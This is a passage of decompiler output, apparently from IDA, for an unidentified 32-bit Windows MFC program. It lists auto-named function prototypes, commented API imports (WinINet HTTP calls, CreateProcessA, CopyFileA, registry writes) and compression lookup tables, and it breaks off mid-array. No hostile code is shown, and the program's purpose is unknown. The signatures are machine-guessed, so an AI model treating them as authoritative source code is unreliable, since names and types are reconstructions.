int __thiscall sub_4194F4(void *this, int a2, int a3, int a4);
int __thiscall sub_419538(struct CWnd *this, unsigned int a2, WPARAM wParam, unsigned int a4, _DWORD *a5);
CCmdUI *__thiscall sub_419AAA(CCmdUI *this);
HWND *__thiscall sub_419BDD(HWND *this);
// HWND __stdcall AfxGetParentOwner(HWND hWnd); idb
struct CObject *__thiscall sub_419C60(_DWORD *this);
HWND *__thiscall sub_419C88(HWND *this);
// struct CWnd *__stdcall CWnd::GetDescendantWindow(HWND hDlg, int nIDDlgItem, int); idb
// void __stdcall CWnd::SendMessageToDescendants(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam, int, int); idb
int __stdcall sub_419DEA(HWND a1, HWND *a2);
int __thiscall sub_419E2C(void *this, int a2);
int __stdcall sub_419E59(HWND hWnd, int a2); // idb
int __thiscall sub_419F58(struct CWnd *this, unsigned int a2, WPARAM wParam, int a4, _DWORD *a5);
// int __stdcall unknown_libname_30(WNDCLASSA *lpWndClass, int, __int16); idb
HMODULE __stdcall sub_41A5A9(const INITCOMMONCONTROLSEX *a1, int a2);
BOOL __stdcall sub_41A620(int a1);
int sub_41A8D7();
// int __thiscall CFrameWnd::IsTracking(CFrameWnd *__hidden this); idb
void __cdecl sub_41A8F9(_DWORD *a1);
// int __thiscall CString::LoadStringA(CString *__hidden this, unsigned int); idb
BOOL __stdcall sub_41AA58(size_t Size);
_DWORD *__thiscall sub_41AB52(_DWORD *this, int a2, int a3, int a4);
// struct CObject *__thiscall CHandleMap::FromHandle(CHandleMap *__hidden this, void *); idb
// int __thiscall sub_41AC76(_DWORD); weak
// struct CHandleMap *__stdcall afxMapHMENU(LPVOID lpMem); idb
struct CObject *__stdcall sub_41AD4D(void *a1);
void *__stdcall sub_41AD62(void *a1);
unsigned int __thiscall sub_41AD80(unsigned int *this);
BOOL __thiscall sub_41ADAA(unsigned int *this);
int __stdcall sub_41ADC0(int a1, int a2, int a3, int a4);
// CDC *__thiscall CDC::CDC(CDC *__hidden this); idb
unsigned int *__thiscall sub_41AE5D(unsigned int *lpMem, char a2);
// struct CHandleMap *__stdcall afxMapHDC(LPVOID lpMem); idb
struct CObject *__stdcall sub_41AEEB(void *a1);
unsigned int __thiscall sub_41AF00(unsigned int *this);
void *__thiscall sub_41AF31(unsigned int *this);
int __thiscall sub_41AF85(HDC *this);
struct CObject *__thiscall sub_41AFF4(_DWORD *this, int i);
struct CObject *__thiscall sub_41B030(_DWORD *this, int a2);
int __thiscall sub_41B076(_DWORD *this, COLORREF color);
int __thiscall sub_41B0A5(_DWORD *this, COLORREF color);
int __thiscall sub_41B0D4(_DWORD *this, int iMode);
int __thiscall sub_41B2E2(HDC *this, LPRECT lprect);
// struct CHandleMap *__stdcall afxMapHGDIOBJ(LPVOID lpMem); idb
struct CObject *__stdcall sub_41B364(void *a1);
unsigned int __thiscall sub_41B379(unsigned int *this);
BOOL __thiscall sub_41B3A3(unsigned int *this);
CArchive *__stdcall sub_41B3B9(CArchive *a1, const void **a2);
// unsigned int __stdcall ReadStringLength(struct CArchive *); idb
struct CArchive *__stdcall sub_41B489(struct CArchive *a1, CString *a2);
unsigned int __thiscall sub_41B521(int this, char *a2, unsigned int a3);
// void __thiscall CArchive::Write(CArchive *__hidden this, const void *Src, unsigned int); idb
int __thiscall sub_41B6C0(int this);
// void __thiscall CArchive::WriteCount(CArchive *__hidden this, unsigned int); idb
// unsigned int __thiscall CArchive::ReadCount(CArchive *__hidden this); idb
int __thiscall sub_41B85C(int this, LPSTR lpString1, int iMaxLength, char *a4);
void __stdcall __noreturn sub_41B8FC(int a1, LPCSTR lpString); // idb
// void __stdcall AfxSetWindowText(HWND hWnd, LPCSTR lpString); idb
// void __stdcall AfxDeleteObject(void **); idb
// void __stdcall AfxGlobalFree(HGLOBAL hMem); idb
int __thiscall sub_41BB78(_DWORD *this);
int __thiscall sub_41BB8B(_DWORD *this, int a2);
int __thiscall sub_41BBD5(_DWORD *this, int a2);
int __stdcall sub_41BC22(int a1);
int __thiscall sub_41BC50(int *this, LPCSTR lpText, UINT uType, int a4);
int __stdcall sub_41BD37(LPCSTR lpText, UINT uType, int a3); // idb
int __stdcall sub_41BD6F(unsigned int a1, UINT uType, int a3); // idb
HWND __stdcall sub_41BDC8(HWND hWnd, HWND *a2);
// int unknown_libname_33(void); weak
HKEY __thiscall sub_41BE70(int this, LPCSTR lpAppName, LPCSTR lpValueName, int Data);
// void __stdcall AfxFormatStrings(struct CString *, UINT uID, const char *const *, int); idb
void __stdcall sub_41C01E(struct CString *a1, UINT uID, char *a3);
BOOL __stdcall sub_41C04E(LPCSTR lpszUrl, LPURL_COMPONENTSA lpUrlComponents, _DWORD *a3, INTERNET_PORT *a4, DWORD dwFlags);
BOOL __stdcall sub_41C182(LPCSTR lpszUrl, _DWORD *a2, CString *a3, CString *a4, INTERNET_PORT *a5, CString *a6, CString *a7, DWORD dwFlags);
int __thiscall sub_41C24F(int this);
LPVOID __thiscall sub_41C29E(LPVOID lpMem, char a2);
int __thiscall sub_41C2BA(int this);
_DWORD *__thiscall sub_41C309(_DWORD *this);
void **__thiscall sub_41C312(void **hMem, char a2);
LPVOID __thiscall sub_41C417(LPVOID lpMem, char a2);
int sub_41C473();
void __thiscall sub_41C477(int this);
HKEY __thiscall sub_41C5AD(_DWORD *this);
char **sub_41C613();
int sub_41C619();
int nullsub_12(void); // weak
void __cdecl sub_41C630(); // idb
struct CNoTrackObject *__stdcall sub_41C63A(); // idb
CWinThread *__thiscall sub_41C66B(CWinThread *lpMem, char a2);
char **sub_41C6F6();
// struct CNoTrackObject *__stdcall CThreadLocal<_AFX_THREAD_STATE>::CreateObject(); idb
struct CNoTrackObject *__stdcall sub_41C745(); // idb
_DWORD *__thiscall sub_41C75A(_DWORD *hMem, char a2);
_DWORD *__thiscall sub_41C775(_DWORD *hMem, char a2);
// void __stdcall _AfxLoadDotBitmap(); idb
char **sub_41C870();
int sub_41C876();
// int unknown_libname_34(void); weak
void __cdecl sub_41C89E(); // idb
char **sub_41C8A8();
int sub_41C8AE();
// int unknown_libname_35(void); weak
void __cdecl sub_41C8D6(); // idb
void ***sub_41C8F7();
char **sub_41C917();
unsigned int *__thiscall sub_41C943(unsigned int *this, char a2);
void *__thiscall sub_41C963(unsigned int *this);
char **sub_41C968();
unsigned int *__thiscall sub_41C98A(unsigned int *this, char a2);
BOOL __thiscall sub_41C9AA(unsigned int *this);
char **sub_41C9D3();
int sub_41C9D9();
char *sub_41C9E3();
// void __cdecl unknown_libname_36(); idb
int sub_41CA19();
char *sub_41CA23();
// void __cdecl unknown_libname_37(); idb
char *__thiscall sub_41CA70(char *hMem, char a2);
void __thiscall sub_41CA8B(char *this);
// struct _AFX_THREAD_STATE *__stdcall AfxGetThreadState(); idb
int sub_41CB0F();
int nullsub_13(void); // weak
void __cdecl sub_41CB26(); // idb
void __thiscall CThreadLocalObject::~CThreadLocalObject(CThreadLocalObject *__hidden this); // idb
_DWORD *__thiscall sub_41CB98(_DWORD *hMem, char a2);
void __thiscall sub_41CBB3(_DWORD *this);
_DWORD *__thiscall sub_41CC28(_DWORD *this);
_DWORD *__thiscall sub_41CC47(_DWORD *hMem, char a2);
void __thiscall sub_41CC62(_DWORD *this);
int sub_41CD10();
int nullsub_14(void); // weak
void __cdecl sub_41CD27(); // idb
// struct AFX_MODULE_STATE *__stdcall AfxGetModuleState(); idb
// struct AFX_MODULE_THREAD_STATE *__stdcall AfxGetModuleThreadState(); idb
// void __thiscall CTypeLibCache::Unlock(CTypeLibCache *__hidden this); idb
_DWORD *__thiscall sub_41CDCB(_DWORD *hMem, char a2);
void __thiscall sub_41CDE6(_DWORD *this);
char **sub_41CE02();
void sub_41CE0D();
char **sub_41CE18();
char **sub_41CE1E();
int sub_41CE24();
// int unknown_libname_38(void); weak
void __cdecl sub_41CE4C(); // idb
char **sub_41CE56();
int sub_41CE5C();
// int unknown_libname_39(void); weak
void __cdecl sub_41CE84(); // idb
int sub_41CE8E();
int nullsub_15(void); // weak
void __cdecl sub_41CEA5(); // idb
void __thiscall CProcessLocalObject::~CProcessLocalObject(CProcessLocalObject *__hidden this); // idb
// int CProcessLocal<_AFX_SOCK_STATE>::CreateObject(); weak
int sub_41CEC9();
int sub_41CED3();
void __cdecl sub_41CEE9(); // idb
// void __thiscall CSimpleList::AddHead(CSimpleList *__hidden this, void *); idb
int __thiscall sub_41CF06(int *this, int a2);
// void *__stdcall CNoTrackObject::operator new(SIZE_T uBytes); idb
// void __stdcall CNoTrackObject::operator delete(HLOCAL hMem); idb
int __thiscall sub_41D017(int this);
int __thiscall sub_41D186(int this, int a2, int a3);
HLOCAL __thiscall sub_41D270(HLOCAL hMem, char a2);
int nullsub_2(void); // weak
int __thiscall sub_41D28C(int this, int a2, int a3);
// struct CNoTrackObject *__thiscall CThreadLocalObject::GetData(CThreadLocalObject *__hidden this, struct CNoTrackObject *(__stdcall *)()); idb
// void __thiscall CThreadLocalObject::~CThreadLocalObject(CThreadLocalObject *__hidden this); idb
int __thiscall sub_41D413(void *this, int (*a2)(void));
// void __stdcall AfxTermLocalData(HINSTANCE, int); idb
// void __stdcall AfxTlsRelease(); idb
// HKEY __thiscall CWinApp::GetSectionKey(CWinApp *__hidden this, const char *); idb
char **sub_41D5E1();
_DWORD *sub_41D5E7();
CWnd *__thiscall sub_41D627(CWnd *this, char a2);
void __thiscall CWnd::~CWnd(CWnd *__hidden this); // idb
char **sub_41D64C();
int sub_41D652();
char *sub_41D65C();
// void __cdecl unknown_libname_40(); idb
_DWORD *sub_41D692();
int sub_41D6C3();
void sub_41D708();
void __stdcall sub_41D756(int a1);
// void __stdcall AfxUnlockGlobals(int); idb
int sub_41D7E7();
AUX_DATA *sub_41D7F1();
void __cdecl sub_41D807(); // idb
// AUX_DATA *__thiscall AUX_DATA::AUX_DATA(AUX_DATA *__hidden this); idb
int (__stdcall *__thiscall sub_41D8FE(_DWORD *this))(_DWORD);
int (__cdecl *__thiscall sub_41D93F(_DWORD *this))(_DWORD *);
int sub_41D975();
int nullsub_16(void); // weak
void __cdecl sub_41D98C(); // idb
int sub_41D996();
int nullsub_17(void); // weak
void __cdecl sub_41D9AD(); // idb
char **sub_41D9B7();
char **sub_41D9BD();
// _DWORD __stdcall sub_41D9C3(_DWORD, _DWORD, _DWORD, _DWORD); weak
char **sub_41DB99();
char **sub_41DB9F();
// int __stdcall AfxInitDBCS(); idb
int sub_41DBCD();
char **sub_41DBF2();
unsigned int *__thiscall sub_41DC14(unsigned int *this, char a2);
BOOL __thiscall sub_41DC34(unsigned int *this);
char **sub_41DC5D();
int sub_41DC63();
char *sub_41DC6D();
// void __cdecl unknown_libname_41(); idb
void *__thiscall sub_41DCA3(_DWORD *this);
_DWORD *__thiscall sub_41DCD0(_DWORD *hMem, char a2);
// void __stdcall AfxSocketTerm(); idb
int __stdcall sub_41DD1D(char *lpWSAData);
void __thiscall sub_41DE22(void **this);
// void __thiscall CWinThread::~CWinThread(CWinThread *__hidden this); idb
// void __stdcall AfxWinTerm(); idb

//-------------------------------------------------------------------------
// Data declarations

_UNKNOWN loc_416708; // weak
_UNKNOWN loc_41E504; // weak
_UNKNOWN loc_41E62C; // weak
// extern LSTATUS (__stdcall *RegSetValueExA)(HKEY hKey, LPCSTR lpValueName, DWORD Reserved, DWORD dwType, const BYTE *lpData, DWORD cbData);
// extern LSTATUS (__stdcall *RegCloseKey)(HKEY hKey);
// extern void (__stdcall *InitCommonControls)();
// extern int (__stdcall *SaveDC)(HDC hdc);
// extern HGDIOBJ (__stdcall *GetStockObject)(int i);
// extern int (__stdcall *Escape)(HDC hdc, int iEscape, int cjIn, LPCSTR pvIn, LPVOID pvOut);
// extern BOOL (__stdcall *TextOutA)(HDC hdc, int x, int y, LPCSTR lpString, int c);
// extern BOOL (__stdcall *RectVisible)(HDC hdc, const RECT *lprect);
// extern BOOL (__stdcall *PtVisible)(HDC hdc, int x, int y);
// extern int (__stdcall *GetClipBox)(HDC hdc, LPRECT lprect);
// extern BOOL (__stdcall *DeleteObject)(HGDIOBJ ho);
// extern int (__stdcall *SetMapMode)(HDC hdc, int iMode);
// extern COLORREF (__stdcall *SetTextColor)(HDC hdc, COLORREF color);
// extern COLORREF (__stdcall *SetBkColor)(HDC hdc, COLORREF color);
// extern HGDIOBJ (__stdcall *SelectObject)(HDC hdc, HGDIOBJ h);
// extern BOOL (__stdcall *DeleteDC)(HDC hdc);
// extern BOOL (__stdcall *GlobalUnlock)(HGLOBAL hMem);
// extern LPVOID (__stdcall *GlobalLock)(HGLOBAL hMem);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *GetVersionExA)(LPOSVERSIONINFOA lpVersionInformation);
// extern UINT (__stdcall *GetDriveTypeA)(LPCSTR lpRootPathName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *FreeLibrary)(HMODULE hLibModule);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern HMODULE (__stdcall *LoadLibraryA)(LPCSTR lpLibFileName);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern HGLOBAL (__stdcall *GlobalAlloc)(UINT uFlags, SIZE_T dwBytes);
// extern void (__stdcall *SetLastError)(DWORD dwErrCode);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetTimeZoneInformation)(LPTIME_ZONE_INFORMATION lpTimeZoneInformation);
// extern DWORD (__stdcall *GetVersion)();
// extern int (__stdcall *lstrcmpiA)(LPCSTR lpString1, LPCSTR lpString2);
// extern ATOM (__stdcall *GlobalDeleteAtom)(ATOM nAtom);
// extern LONG (__stdcall *InterlockedIncrement)(volatile LONG *lpAddend);
// extern LONG (__stdcall *InterlockedDecrement)(volatile LONG *lpAddend);
// extern HLOCAL (__stdcall *LocalFree)(HLOCAL hMem);
// extern LPSTR (__stdcall *lstrcpynA)(LPSTR lpString1, LPCSTR lpString2, int iMaxLength);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern HLOCAL (__stdcall *LocalAlloc)(UINT uFlags, SIZE_T uBytes);
// extern void (__stdcall *InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern HGLOBAL (__stdcall *GlobalHandle)(LPCVOID pMem);
// extern HGLOBAL (__stdcall *GlobalReAlloc)(HGLOBAL hMem, SIZE_T dwBytes, UINT uFlags);
// extern BOOL (__stdcall *TlsSetValue)(DWORD dwTlsIndex, LPVOID lpTlsValue);
// extern HLOCAL (__stdcall *LocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
// extern LPVOID (__stdcall *TlsGetValue)(DWORD dwTlsIndex);
// extern ATOM (__stdcall *GlobalFindAtomA)(LPCSTR lpString);
// extern ATOM (__stdcall *GlobalAddAtomA)(LPCSTR lpString);
// extern UINT (__stdcall *GlobalGetAtomNameA)(ATOM nAtom, LPSTR lpBuffer, int nSize);
// extern SIZE_T (__stdcall *HeapSize)(HANDLE hHeap, DWORD dwFlags, LPCVOID lpMem);
// extern HANDLE (__stdcall *GetStdHandle)(DWORD nStdHandle);
// extern BOOL (__stdcall *HeapDestroy)(HANDLE hHeap);
// extern HANDLE (__stdcall *HeapCreate)(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern LPTOP_LEVEL_EXCEPTION_FILTER (__stdcall *SetUnhandledExceptionFilter)(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);
// extern LPSTR (__stdcall *GetCommandLineA)();
// extern BOOL (__stdcall *WritePrivateProfileStringA)(LPCSTR lpAppName, LPCSTR lpKeyName, LPCSTR lpString, LPCSTR lpFileName);
// extern DWORD (__stdcall *GetPrivateProfileStringA)(LPCSTR lpAppName, LPCSTR lpKeyName, LPCSTR lpDefault, LPSTR lpReturnedString, DWORD nSize, LPCSTR lpFileName);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *FindFirstFileA)(LPCSTR lpFileName, LPWIN32_FIND_DATAA lpFindFileData);
// extern BOOL (__stdcall *FindNextFileA)(HANDLE hFindFile, LPWIN32_FIND_DATAA lpFindFileData);
// extern void (__stdcall *GetStartupInfoA)(LPSTARTUPINFOA lpStartupInfo);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern HANDLE (__stdcall *CreateFileA)(LPCSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern DWORD (__stdcall *GetFileSize)(HANDLE hFile, LPDWORD lpFileSizeHigh);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *CopyFileA)(LPCSTR lpExistingFileName, LPCSTR lpNewFileName, BOOL bFailIfExists);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern DWORD (__stdcall *GetTickCount)();
// extern BOOL (__stdcall *IsBadReadPtr)(const void *lp, UINT_PTR ucb);
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern LPVOID (__stdcall *HeapReAlloc)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes);
// extern LPVOID (__stdcall *HeapAlloc)(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
// extern void (__stdcall __noreturn *ExitProcess)(UINT uExitCode);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *SetProcessWorkingSetSize)(HANDLE hProcess, SIZE_T dwMinimumWorkingSetSize, SIZE_T dwMaximumWorkingSetSize);
// extern HINSTANCE (__stdcall *ShellExecuteA)(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd);
// extern int (__stdcall *GetMenuItemCount)(HMENU hMenu);
// extern HWND (__stdcall *SetFocus)(HWND hWnd);
// extern UINT (__stdcall *RegisterWindowMessageA)(LPCSTR lpString);
// extern LRESULT (__stdcall *DefWindowProcA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HANDLE (__stdcall *RemovePropA)(HWND hWnd, LPCSTR lpString);
// extern LRESULT (__stdcall *CallWindowProcA)(WNDPROC lpPrevWndFunc, HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HANDLE (__stdcall *GetPropA)(HWND hWnd, LPCSTR lpString);
// extern BOOL (__stdcall *SetPropA)(HWND hWnd, LPCSTR lpString, HANDLE hData);
// extern DWORD (__stdcall *GetClassLongA)(HWND hWnd, int nIndex);
// extern HWND (__stdcall *CreateWindowExA)(DWORD dwExStyle, LPCSTR lpClassName, LPCSTR lpWindowName, DWORD dwStyle, int X, int Y, int nWidth, int nHeight, HWND hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam);
// extern UINT (__stdcall *GetMenuItemID)(HMENU hMenu, int nPos);
// extern HMENU (__stdcall *GetSubMenu)(HMENU hMenu, int nPos);
// extern HMENU (__stdcall *GetMenu)(HWND hWnd);
// extern ATOM (__stdcall *RegisterClassA)(const WNDCLASSA *lpWndClass);
// extern BOOL (__stdcall *GetClassInfoA)(HINSTANCE hInstance, LPCSTR lpClassName, LPWNDCLASSA lpWndClass);
// extern BOOL (__stdcall *WinHelpA)(HWND hWndMain, LPCSTR lpszHelp, UINT uCommand, ULONG_PTR dwData);
// extern HWND (__stdcall *GetCapture)();
// extern BOOL (__stdcall *DestroyMenu)(HMENU hMenu);
// extern LONG (__stdcall *SetWindowLongA)(HWND hWnd, int nIndex, LONG dwNewLong);
// extern BOOL (__stdcall *ShowWindow)(HWND hWnd, int nCmdShow);
// extern BOOL (__stdcall *SystemParametersInfoA)(UINT uiAction, UINT uiParam, PVOID pvParam, UINT fWinIni);
// extern LRESULT (__stdcall *SendMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern int (__stdcall *GetSystemMetrics)(int nIndex);
// extern BOOL (__stdcall *DestroyWindow)(HWND hWnd);
// extern BOOL (__stdcall *UnhookWindowsHookEx)(HHOOK hhk);
// extern UINT (__stdcall *GetMenuState)(HMENU hMenu, UINT uId, UINT uFlags);
// extern BOOL (__stdcall *ModifyMenuA)(HMENU hMnu, UINT uPosition, UINT uFlags, UINT_PTR uIDNewItem, LPCSTR lpNewItem);
// extern BOOL (__stdcall *SetMenuItemBitmaps)(HMENU hMenu, UINT uPosition, UINT uFlags, HBITMAP hBitmapUnchecked, HBITMAP hBitmapChecked);
// extern int (__stdcall *DrawTextA)(HDC hdc, LPCSTR lpchText, int cchText, LPRECT lprc, UINT format);
// extern BOOL (__stdcall *EnableMenuItem)(HMENU hMenu, UINT uIDEnableItem, UINT uEnable);
// extern HWND (__stdcall *GetFocus)();
// extern HWND (__stdcall *GetNextDlgTabItem)(HWND hDlg, HWND hCtl, BOOL bPrevious);
// extern SHORT (__stdcall *GetKeyState)(int nVirtKey);
// extern LRESULT (__stdcall *CallNextHookEx)(HHOOK hhk, int nCode, WPARAM wParam, LPARAM lParam);
// extern HWND (__stdcall *GetLastActivePopup)(HWND hWnd);
// extern BOOL (__stdcall *IsWindowEnabled)(HWND hWnd);
// extern BOOL (__stdcall *EnableWindow)(HWND hWnd, BOOL bEnable);
// extern BOOL (__stdcall *PostMessageA)(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam);
// extern HWND (__stdcall *GetParent)(HWND hWnd);
// extern LONG (__stdcall *GetWindowLongA)(HWND hWnd, int nIndex);
// extern HWND (__stdcall *FindWindowExA)(HWND hWndParent, HWND hWndChildAfter, LPCSTR lpszClass, LPCSTR lpszWindow);
// extern BOOL (__stdcall *PeekMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg);
// extern BOOL (__stdcall *GetMessageA)(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax);
// extern BOOL (__stdcall *TranslateMessage)(const MSG *lpMsg);
// extern LRESULT (__stdcall *DispatchMessageA)(const MSG *lpMsg);
// extern int (*wsprintfA)(LPSTR, LPCSTR, ...);
// extern int (__stdcall *MessageBoxA)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);
// extern HINTERNET (__stdcall *InternetOpenA)(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags);
// extern BOOL (__stdcall *InternetSetOptionA)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
// extern BOOL (__stdcall *InternetCloseHandle)(HINTERNET hInternet);
// extern HINTERNET (__stdcall *InternetConnectA)(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext);
// extern BOOL (__stdcall *InternetCanonicalizeUrlA)(LPCSTR lpszUrl, LPSTR lpszBuffer, LPDWORD lpdwBufferLength, DWORD dwFlags);
// extern BOOL (__stdcall *InternetCrackUrlA)(LPCSTR lpszUrl, DWORD dwUrlLength, DWORD dwFlags, LPURL_COMPONENTSA lpUrlComponents);
// extern HINTERNET (__stdcall *HttpOpenRequestA)(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext);
// extern BOOL (__stdcall *HttpSendRequestA)(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
// extern BOOL (__stdcall *HttpQueryInfoA)(HINTERNET hRequest, DWORD dwInfoLevel, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
// extern BOOL (__stdcall *InternetReadFile)(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
void **off_41F408 = &off_420258; // weak
int (*off_41F510)() = &sub_41C917; // weak
void *off_41F51C = &loc_4045C0; // weak
void *off_41F520 = &loc_404710; // weak
void *(__thiscall *off_41F528)(std::locale::facet *__hidden this, unsigned int) = &std::locale::facet::`scalar deleting destructor'; // weak
int dword_41F5AC[29] =
{
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  1,
  1,
  1,
  1,
  2,
  2,
  2,
  2,
  3,
  3,
  3,
  3,
  4,
  4,
  4,
  4,
  5,
  5,
  5,
  5,
  0
}; // weak
int dword_41F620[] = { 0 }; // weak
char byte_41F6E4[20] =
{
  '\x10',
  '\x11',
  '\x12',
  '\0',
  '\b',
  '\a',
  '\t',
  '\x06',
  '\n',
  '\x05',
  '\v',
  '\x04',
  '\f',
  '\x03',
  '\r',
  '\x02',
  '\x0E',
  '\x01',
  '\x0F',
  '\0'
}; // weak
_UNKNOWN unk_41F6F8; // weak
_UNKNOWN unk_41FB78; // weak
char byte_41FBF0[256] =
{
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x04',
  '\x05',
  '\x05',
  '\x06',
  '\x06',
  '\x06',
  '\x06',
  '\a',
  '\a',
  '\a',
  '\a',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\b',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\t',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\n',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\v',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\f',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\r',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
  '\x0F',
